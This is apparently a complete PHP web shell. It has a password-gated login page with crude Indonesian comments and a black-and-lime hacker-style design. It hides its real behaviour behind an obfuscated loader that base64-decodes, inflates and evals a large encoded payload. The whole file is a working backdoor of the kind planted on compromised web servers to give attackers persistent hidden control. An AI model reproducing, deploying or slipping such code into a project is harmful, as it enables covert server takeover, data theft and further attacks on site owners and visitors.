<?php
// bacot kontol
// lo jga nikung
// kocak
set_time_limit(0);
error_reporting(0);
$auth_pass ="8ecd58e134c5c619e3c548a84180a46d";
if(get_magic_quotes_gpc()) {   
function VEstripslashes($array) {     
return is_array($array) ? array_map('VEstripslashes', $array) : stripslashes($array);   }   
$_POST = VEstripslashes($_POST); 
$_COOKIE = VEstripslashes($_COOKIE); } 
function Login() {
  die("<html>
  <head>
  <title>KONTOL</title>
  </head>
  <style>html{background-color:black;color:lime;}input{background-color:transparent;box-shadow: 0 0 10px lime;color:white;border-color:white;}</style>
  <body>
  <br>
  <h1><center>Dapid Ganteng><center>wkwk kocak</center><br><center><form method='post'><input style='text-align:center;' type='password' name='pass'></form>
 ");
}

function VEsetcookie($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}

if(!empty($auth_pass)) {
    if(isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass))
        VEsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);

    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))
        Login();
}
$Cyto = "Sy1LzNFQt1dLL7FW10uvKs1Lzs8tKEotLtZIr8rMS8tJLEnVSEosTjUziU9JT\x635PSdUoLikqSi3TUPHJrNAE\x41Ws\x41";
$Lix = "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";
eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
exit;
?>
